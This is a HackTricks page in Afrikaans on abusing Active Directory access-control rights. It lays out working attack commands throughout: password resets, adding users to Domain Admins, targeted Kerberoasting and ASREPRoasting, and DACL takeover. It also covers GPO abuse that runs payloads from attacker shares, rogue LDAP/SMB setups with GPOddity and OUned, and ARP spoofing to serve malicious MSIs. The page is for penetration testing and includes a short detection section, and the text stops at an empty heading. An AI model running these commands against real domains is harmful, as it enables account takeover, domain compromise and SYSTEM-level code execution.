# Misbruik van Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is hoofsaaklik ’n opsomming van die tegnieke uit** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Raadpleeg die oorspronklike artikels vir meer besonderhede.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-regte op gebruiker**

Hierdie voorreg gee ’n aanvaller volle beheer oor ’n teikengebruikersrekening. Sodra `GenericAll`-regte met die `Get-ObjectAcl`-opdrag bevestig is, kan ’n aanvaller:

- **Die teiken se wagwoord verander**: Met `net user <username> <password> /domain` kan die aanvaller die gebruiker se wagwoord terugstel.
- Vanaf Linux kan jy dieselfde oor SAMR met Samba `net rpc` doen:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **As die rekening gedeaktiveer is, verwyder die UAC-vlag**: `GenericAll` laat toe dat `userAccountControl` gewysig word. Vanaf Linux kan BloodyAD die `ACCOUNTDISABLE`-vlag verwyder:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Ken ’n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT)-hashes te onttrek en te probeer kraak.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Skakel voorafverifikasie vir die gebruiker af, wat hul rekening kwesbaar maak vir ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Met `GenericAll` op ’n gebruiker kan jy ’n sertifikaatgebaseerde geloofsbrief byvoeg en as daardie gebruiker aanmeld sonder om hul wagwoord te verander. Sien:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-regte op groep**

Hierdie voorreg stel ’n aanvaller in staat om groeplidmaatskap te manipuleer as hulle `GenericAll`-regte op ’n groep soos `Domain Admins` het. Nadat die groep se onderskeie naam met `Get-NetGroup` geïdentifiseer is, kan die aanvaller:

- **Voeg hulself by die Domain Admins-groep**: Dit kan met direkte opdragte gedoen word, of met modules soos Active Directory of PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Vanuit Linux kan jy ook BloodyAD gebruik om jouself by arbitrêre groepe te voeg wanneer jy GenericAll/Write-lidmaatskapregte oor hulle het. As die teikengroep genestel is onder “Remote Management Users”, kry jy onmiddellik WinRM-toegang op gashere wat daardie groep erken:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

As jy hierdie regte op ’n rekenaarobjek of gebruikersrekening het, kan jy:

- **Kerberos Resource-based Constrained Delegation**: ’n rekenaarobjek oorneem.
- **Shadow Credentials**: Hierdie tegniek gebruik om ’n rekenaar- of gebruikersrekening na te maak deur die regte om shadow credentials te skep, uit te buit.

## Skuif ’n objek na OU-regte wat geërf word

’n Pad kan **skuifregte oor ’n rekening** met **skryfregte wat van ’n bestemming-OU geërf word** kombineer, selfs wanneer geen van die prinsipale aanvanklik die rekening se sensitiewe eienskappe kan wysig nie. Verifieer die bronobjek se skuifregte en `CreateChild` op die bestemming, skuif die objek en kontroleer dan weer sy effektiewe DACL. Byvoorbeeld, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` in powerview.py skuif die gebruiker; ’n beheerde groep met geërfde `GenericWrite` op daardie OU kan dan ’n [shadow credential](shadow-credentials.md) byvoeg. Die skuif skep nie op sigself die geërfde reg nie.<sup>[[18]](#references)</sup>

As jy `GenericAll` op ’n OU het, maar geen geskikte geërfde ACE nie, kan `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` een vir die afstammelinge daarvan byvoeg. Toets die teikenrekening afsonderlik: **AdminSDHolder-beskermde rekeninge se inheritance is gedeaktiveer**, dus kan ’n OU ACE gewone gebruikers raak, maar nie op ’n beskermde gebruiker werk nie. Sien [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

’n Afsonderlike misbruikpad bestaan wanneer ’n bevoorregte geskeduleerde opruimingskrip OU’s kies op grond van ACE’s wat deur ’n aanvaller beïnvloed kan word, en dan `Set-ADObject -Clear adminCount` **en** `$acl.SetAccessRuleProtection($False, $False)` op hul afstammelinge uitvoer. As jy die OU DACL kan wysig, gee die groep wat deur die krip nagegaan word die vereiste `ExtendedRight`- of `GenericAll`-ACE; verifieer afsonderlik dat jy die taak kan uitvoer. Die bevoorregte taak kan dan inheritance op ’n voorheen beskermde rekening herstel, sodat die OU ACE toegepas kan word. Bevestig die presiese krip, toestemming om die taak te aktiveer en die resulterende DACL; die skoonmaak van `adminCount` alleen heraktiveer nie inheritance nie, en SDProp kan rekeninge wat steeds in beskermde groepe is, weer beskerm.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

As ’n gebruiker `WriteProperty`-regte op alle objekte vir ’n spesifieke groep het (bv. `Domain Admins`), kan hulle:

- **Voeg hulself by die Domain Admins-groep**: Dit kan bereik word deur die `net user`- en `Add-NetGroupUser`-opdragte te kombineer, en maak voorregte-eskalasie binne die domein moontlik.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) op ’n Groep**

Hierdie privilege stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte te gebruik wat groep-lidmaatskap direk manipuleer. Die volgende reeks opdragte maak dit moontlik om jouself by ’n groep te voeg:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-lidmaatskap)**

’n Soortgelyke voorreg stel aanvallers in staat om hulself direk by groepe te voeg deur groepseienskappe te wysig, mits hulle die `WriteProperty`-reg op daardie groepe het. Hierdie voorreg word bevestig en uitgebuit met:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Die `ExtendedRight` op ’n gebruiker vir `User-Force-Change-Password` maak dit moontlik om wagwoorde terug te stel sonder om die huidige wagwoord te ken. Hierdie reg kan met PowerShell of alternatiewe opdragreëlnutsgoed geverifieer en uitgebuit word. Daar is verskeie metodes om ’n gebruiker se wagwoord terug te stel, insluitend interaktiewe sessies en eenreël-opdragte vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux en demonstreer hoe veelsydig die aanvalvektore is.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner op Groep**

As ’n aanvaller ontdek dat hulle `WriteOwner`-regte oor ’n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral impakvol wanneer die betrokke groep `Domain Admins` is, aangesien die verandering van eienaarskap groter beheer oor groepkenmerke en lidmaatskap moontlik maak. Die proses behels dat die korrekte objek met `Get-ObjectAcl` geïdentifiseer word en dan `Set-DomainObjectOwner` gebruik word om die eienaar te verander, hetsy met ’n SID of naam.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite op gebruiker**

Hierdie toestemming stel ’n aanvaller in staat om gebruikereienskappe te wysig. Met `GenericWrite`-toegang kan die aanvaller spesifiek ’n gebruiker se aanmeldingskrippad verander om ’n kwaadwillige script uit te voer wanneer die gebruiker aanmeld. Dit word gedoen deur die `Set-ADObject`-opdrag te gebruik om die `scriptpath`-eienskap van die teikengebruiker by te werk sodat dit na die aanvaller se script wys.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

'n Meer beperkte `WriteProperty` ACE wat op die gebruiker se [`scriptPath`-kenmerk](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) van toepassing is, kan voldoende wees; `GenericWrite` is nie nodig nie. Kombineer daardie reg met 'n skryfbare script onder die domein se `SYSVOL\<domain>\scripts`- of `NETLOGON`-boom, en beoordeel dan of die teikengebruiker waarskynlik sal aanmeld en die script sal bereik. Die script loop tydens aanmelding in daardie gebruiker se konteks. Gaan die effektiewe AD- en lêer-/deel-ACL's afsonderlik na; 'n ooreenstemmende Allow ACE of 'n skryfbare gids alleen bevestig nie dat die volledige pad beskikbaar is nie.

## **GenericWrite op groep**

Met hierdie voorreg kan aanvallers groeplidmaatskap manipuleer, byvoorbeeld deur hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels dat 'n geloofsbriewepak geskep word, dit gebruik word om gebruikers by 'n groep te voeg of daaruit te verwyder, en die lidmaatskapveranderinge met PowerShell-opdragte bevestig word.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Vanaf Linux kan Samba `net` lede byvoeg of verwyder wanneer jy `GenericWrite` op die groep het (nuttig wanneer PowerShell/RSAT nie beskikbaar is nie):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Eienaarskap van ’n AD-objek en `WriteDACL`-voorregte daarop stel ’n aanvaller in staat om homself `GenericAll`-voorregte oor die objek toe te ken. Dit word deur ADSI-manipulasie gedoen en bied volle beheer oor die objek en die vermoë om sy groeplidmaatskappe te wysig. Daar is egter beperkings wanneer ’n mens hierdie voorregte met die Active Directory-module se `Set-Acl` / `Get-Acl`-cmdlets probeer uitbuit.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner vinnige oorname (PowerView)

Wanneer jy `WriteOwner` en `WriteDacl` oor ’n gebruiker- of diensrekening het, kan jy volle beheer oorneem en die wagwoord daarvan met PowerView terugstel sonder om die ou wagwoord te ken:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notas:
- Jy moet dalk eers die eienaar na jouself verander as jy net `WriteOwner` het:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Valideer toegang met enige protokol (SMB/LDAP/RDP/WinRM) ná wagwoordterugstelling.

## **Replikasie op die domein (DCSync)**

Die DCSync-aanval benut spesifieke replikasieregtoestemmings op die domein om ’n Domain Controller na te boots en data, insluitend gebruikersbewyse, te sinchroniseer. Hierdie kragtige tegniek vereis toestemmings soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot ’n Domain Controller.<sup>[[5]](#references)</sup> [**Kom hier meer te wete oor die DCSync-aanval.**](../dcsync.md)

## GPO-delegering <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-delegering

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur, kan beduidende sekuriteitsrisiko’s inhou. As ’n gebruiker soos `offense\spotless` byvoorbeeld GPO-bestuursregte gedelegeer is, kan hulle voorregte soos **WriteProperty**, **WriteDacl** en **WriteOwner** hê. Hierdie toestemmings kan vir kwaadwillige doeleindes misbruik word, soos met PowerView geïdentifiseer: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO-toestemmings opnoem

Om verkeerd gekonfigureerde GPOs te identifiseer, kan PowerSploit se cmdlets aan mekaar gekoppel word. Dit maak dit moontlik om GPOs op te spoor wat ’n spesifieke gebruiker mag bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars waarop ’n gegewe beleid toegepas is**: Dit is moontlik om vas te stel op watter rekenaars ’n spesifieke GPO van toepassing is, wat help om die omvang van die moontlike impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleide wat op ’n gegewe rekenaar toegepas is**: Om te sien watter beleide op ’n bepaalde rekenaar toegepas is, kan opdragte soos `Get-DomainGPO` gebruik word.

**OU’s waarop ’n gegewe beleid toegepas is**: Organisasie-eenhede (OU’s) wat deur ’n gegewe beleid geraak word, kan met `Get-DomainOU` geïdentifiseer word.

Jy kan ook die instrument [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs op te noem en probleme daarin te vind.

### Misbruik van GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPOs kan uitgebuit word om kode uit te voer, byvoorbeeld deur ’n onmiddellike geskeduleerde taak te skep. Dit kan gebruik word om ’n gebruiker by die plaaslike administrateursgroep op geraakte masjiene te voeg, wat voorregte aansienlik verhoog:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Die GroupPolicy-module, indien geïnstalleer, maak dit moontlik om nuwe GPO's te skep en te koppel, en voorkeure soos registerwaardes in te stel om backdoors op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker by die rekenaar aanmeld voordat dit uitgevoer word:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied ’n metode om bestaande GPO’s te misbruik deur take by te voeg of instellings te wysig sonder om nuwe GPO’s te hoef te skep. Hierdie nutsding vereis dat bestaande GPO’s gewysig word, of dat RSAT-nutsmiddels gebruik word om nuwes te skep voordat veranderinge toegepas word:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Dwing beleidsopdatering

GPO-opdaterings vind tipies ongeveer elke 90 minute plaas. Om hierdie proses te bespoedig, veral nadat ’n verandering aangebring is, kan die opdrag `gpupdate /force` op die teikenrekenaar gebruik word om ’n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPO’s toegepas word sonder om vir die volgende outomatiese opdateringsiklus te wag.

### Agter die skerms

Wanneer die Geskeduleerde take vir ’n gegewe GPO, soos die `Misconfigured Policy`, ondersoek word, kan bevestig word dat take soos `evilTask` bygevoeg is. Hierdie take word met behulp van skrifte of opdragreëlnutsgoed geskep om stelselgedrag te wysig of voorregte te eskaleer.

Die taak se struktuur, soos dit in die XML-konfigurasielêer verskyn wat deur `New-GPOImmediateTask` gegenereer word, beskryf die besonderhede van die geskeduleerde taak — insluitend die opdrag wat uitgevoer moet word en die snellers daarvan. Hierdie lêer wys hoe geskeduleerde take binne GPO’s gedefinieer en bestuur word, en bied ’n manier om arbitrêre opdragte of skrifte as deel van beleidsafdwinging uit te voer.

### Gebruikers en groepe

GPO’s laat ook toe dat gebruikers- en groeplidmaatskappe op teikenstelsels gewysig word. Deur die Gebruikers- en Groepe-beleidlêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe, soos die plaaslike `administrators`-groep, voeg. Dit is moontlik deur die delegering van GPO-bestuurstoestemmings, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groeplidmaatskappe te verander.

Die XML-konfigurasielêer vir Gebruikers en Groepe beskryf hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers verhoogde voorregte op die betrokke stelsels kry. Hierdie metode bied ’n direkte manier om voorregte deur GPO-manipulasie te eskaleer.

Vir sekuriteitsinstellings soos plaaslike groeplidmaatskap en gebruikersregte, inspekteer ook die toegepaste GPO-sjabloon by `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` en die ACL van die `SecEdit`-gids. ’n Skryfbare gids of lêer is ’n aanduiding wat nagegaan moet word: effektiewe SYSVOL-deeltoegang, weierings- en geërfde ACL’s, die Groepbeleid-houer se toestemmings, beleidsomvang en kliëntverversing bepaal steeds of ’n verandering in werking kan tree. Lidmaatskap van ’n groep met die naam “GPO Managers” bewys op sigself nie dat daar wysigingstoestemmings is nie. [Microsoft dokumenteer hierdie sjabloonpad en die skeiding tussen die Groepbeleid-houer en -sjabloon.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Daarbenewens kan verdere metodes om kode uit te voer of volharding te handhaaf, soos die benutting van aanmeld-/afmeldskrifte, die wysiging van registersleutels vir outomatiese uitvoering, die installering van sagteware via .msi-lêers of die wysiging van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie maniere om toegang te behou en teikenstelsels te beheer deur GPO’s te misbruik.

### Herleiding van GPC/GPT-herwinning na geverifieerde skelm dienste

’n GPO bestaan uit ’n LDAP-**Groepbeleid-houer (GPC)** met metadata en ’n SMB-gehoste **Groepbeleid-sjabloon (GPT)** met die beleidslêers. Tydens verversing volg die kliënt die houer se `gPLink`, lees die verwysde GPC en sy `gPCFileSysPath`, en laai dan die GPT van daardie UNC-pad af. Gevolglik kan skryftoegang tot óf die GPC self óf die `gPLink` van ’n OU, Site of Domain omgeskakel word na bevoorregte beleidsverwerking.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Vergiftiging van `gPCFileSysPath` met GPOddity

As die beheerde prinsipal die teiken-GPC kan skryf (direk of deur **NTLM relay to LDAP**), vervang `gPCFileSysPath` met ’n UNC-pad wat deur die aanvaller gehost word. [GPOddity](https://github.com/synacktiv/GPOddity) outomatiseer die LDAP-verandering en bedien ’n kwaadwillige GPT wat modulegebaseerde beleidslêers of ’n Immediate Task bevat wat die Groepbeleid-kliënt as `NT AUTHORITY\SYSTEM` uitvoer.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

’n Anonieme SMB-deel of een wat nie geloofsbriewe vereis nie, is nie voldoende op huidige Windows-kliënte nie: SMB Secure Negotiate vereis bewys dat verifikasie geslaag het, dus moet die skelm diens die domeinidentiteit valideer, die SMB-sessiesleutel aflei en sy antwoorde korrek onderteken. Stel GPOddity in ingebedde modus op met ’n beheerde masjienrekening en sy dienssleutel, en kies dan ’n rekenaar- of gebruikerskant-loonvrag in die `[COMMANDS]`-afdeling.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Gebruiker-GPO-randgeval:** ná MS16-072 skep Windows steeds twee SMB2-sessies in dieselfde TCP-verbinding: die gebruikersessie lees `GPT.INI`, en daarna lees die rekenaarrekeningsessie effektiewe konfigurasie soos `ScheduledTasks.xml`. ’n Kwaadwillige bediener moet dus verifikasietoestand, sessiesleutels en ondertekeningsleutels volgens SMB2 `SessionId` indekseer, nie net volgens sok nie. Die Scapy-fork wat in GPOddity/OUned ingebed is, implementeer dit met `SMBStreamSocketMultiplexing` en ’n multiplexing-bewuste `SMBServer`; enkel-sessie-Impacket/Scapy-bedieners hergebruik andersins die verkeerde ondertekeningstoestand en misluk met gebruikersbeleide.<sup>[[15]](#references)</sup>

#### `gPLink`-vergiftiging met OUned

Met `WriteGPLink`, `GenericWrite` of ekwivalente beheer oor ’n OU, Site of Domain, kan ’n aanvaller ’n skakel byvoeg waarvan die GPC DN deur ’n aanvaller-beheerde LDAP-gasheer bedien word. Hierdie tegniek is oorspronklik deur Petros Koutroumpis aangebied; [OUned](https://github.com/synacktiv/OUned) outomatiseer die LDAP-skryfbewerking en die kwaadwillige GPC/GPT-ketting.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Die slagoffer staaf eers teen die rogue LDAP-diens en ontvang ’n GPC waarvan `gPCFileSysPath` na die rogue SMB-diens wys; daarna staaf dit teen SMB en pas die verskafde GPT toe. OUned benodig dus ’n rekening met ’n LDAP SPN, ’n masjienrekening met ’n HOST SPN vir SMB (dieselfde masjienrekening kan albei vereistes dek), en DNS-resolusie of omgekeerde aanstuur wat poorte 389 en 445 na die operateur se gasheer stuur.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned se ingebedde Scapy LDAP-bediener valideer Kerberos/SPNEGO met die werklike beheerde dienssleutel en bedien arbitrêre GPC-data vanaf JSON. Die leë JSON-sleutel modelleer rootDSE, `base64:`-voorvoegsels verteenwoordig binêre waardes, en die bediener ondersteun add/delete/modify/search plus `BASE`-, `LEVEL`- en `SUBTREE`-soektogte; dit kan sonder beskerming, met integriteit of met vertroulikheid onderhandel. Dit maak die diens herbruikbaar wanneer ’n ander Windows-komponent ’n aanvallerbeheerde LDAP-verwysing volg, maar op geverifieerde LDAP aandring.<sup>[[15]](#references)</sup>

Moenie aanvaar dat die sinkronisering van ’n rekeningwagwoord na ’n dummy-domein elke Kerberos-sleutel reproduseer nie: RC4 word van die wagwoord afgelei, terwyl AES-string-to-key ook ’n sout gebruik wat van die hoofgebruiker se gasheernaam/domein afgelei word. Deur die werklike rekening se AES-sleutel aan `KerberosSSP` te verskaf, vermy jy dat RC4 afgedwing moet word deur ’n waarneembare verandering aan die masjienrekening se selfskryfbare `msDS-SupportedEncryptionTypes`.<sup>[[15]](#references)</sup>

#### Opsporingspunte

Korrelleer veranderinge aan `gPCFileSysPath` of `gPLink` met GPO-weergaweveranderinge en nuwe Immediate/Scheduled Task-XML. Ondersoek skakels na onverwagte benoemingskontekste, UNC-gashere buite die goedgekeurde DC/SYSVOL-stel, DNS-rekords wat masjienrekeningname herlei, LDAP/CIFS-dienstkaartjies vir ongewone masjienrekeninge, en `msDS-SupportedEncryptionTypes`-veranderinge wat RC4 aktiveer.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` oor ’n OU/domein laat jou toe om die teikenhouer se `gPLink`-kenmerk te wysig en **’n bestaande GPO te dwing om toegepas te word** sonder om die GPO self te wysig. Dit raak interessant wanneer die gekoppelde GPO reeds na afgeleë inhoud via **UNC-paaie** (`\\HOST\share\...`) verwys, omdat geverifieerde gebruikers **SYSVOL** kan lees en vanlyn na herbruikbare beleide kan soek.<sup>[[11]](#references)</sup>

Werkvloei op hoë vlak:

1. Gebruik BloodHound om ’n prinsipaal met `WriteGPLink` oor ’n OU te identifiseer en rekenaars/gebruikers binne daardie OU op te som.
2. Kloon `SYSVOL` met leesalleentoegang en ontleed GPO’s om **Software Installation**, **skyfkarterings** (`Drives.xml`) en **aanmeld-/opstartskripte** te vind wat na UNC-paaie verwys.
3. Verkies beleide wat na ’n **direkte gasheernaam** wys (byvoorbeeld `\\DC02\share\pkg.msi`) eerder as DFS-/domeinnaamruimtepaaie, omdat gasheernaamgebaseerde paaie makliker met L2-spoofing herlei kan word.
4. Voeg die gekose GPO-GUID by die teiken-OU se `gPLink` sodat die slagoffer daardie reeds bestaande beleid verwerk.
5. ARP-spoof die UNC-gasheer op dieselfde uitsaaidomein en bind sy IP plaaslik (`ip addr add <target_ip>/32 dev <iface>`) sodat die slagoffer se SMB-verkeer jou gasheer bereik.
6. Bedien die verwagte pad/lêernaam vanaf ’n aanvaller se SMB-bediener (byvoorbeeld `smbserver.py`) en wag vir normale beleidsverwerking.

Voorbeeld van `SYSVOL`-insameling en GPO-korrelasie:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Koppel die bestaande GPO aan die teiken-OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

As die gekoppelde GPO ’n MSI vanaf ’n UNC-pad ontplooi, haal die kliënt dit tydens **computer startup** af en installeer dit as **`NT AUTHORITY\SYSTEM`**. Deur die verwysde host na te boots en ’n kwaadwillige MSI onder dieselfde **share/path/name** aan te bied, kan jy `WriteGPLink` in SYSTEM-kode-uitvoering omskep **sonder om SYSVOL te wysig**.

Belangrike beperkings:

- **Tydsberekening is belangrik**: die nuwe skakel word tydens policy refresh opgespoor (gewoonlik ongeveer elke 90 minute), maar **Software Installation** word gewoonlik eers met ’n **reboot** geaktiveer.
- Windows Installer hou die ontplooiing gewoonlik met die pakket se **`ProductCode`** dop. As die produk reeds geïnstalleer is, kan die ontplooiing oorgeslaan word.
- Om te voorkom dat die installer die MSI verwerp, pas die rogue MSI so aan dat sy **`ProductCode`** en **`PackageCode`** ooreenstem met dié van die legitieme pakket wat die GPO verwag.
- Ou `.aas`-advertensielêers kan in `SYSVOL` agterbly; bevestig dus dat die ontplooiing steeds aktief lyk voordat jy daarop staatmaak.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP-aandryfkarterings in `Drives.xml` veroorsaak dat gebruikers tydens aanmelding of herkoppeling by die opgestelde UNC-pad staaf. As jy die verwysde gasheer spoof, kan jy **NetNTLMv2** vaslê. As SMB doelbewus laat misluk, kan Windows weer probeer oor **WebDAV** en **NTLM oor HTTP** stuur, wat baie meer buigsaam is vir relays na **LDAP(S)**, **AD CS** of **SMB**.

#### Logon/startup script UNC hijack

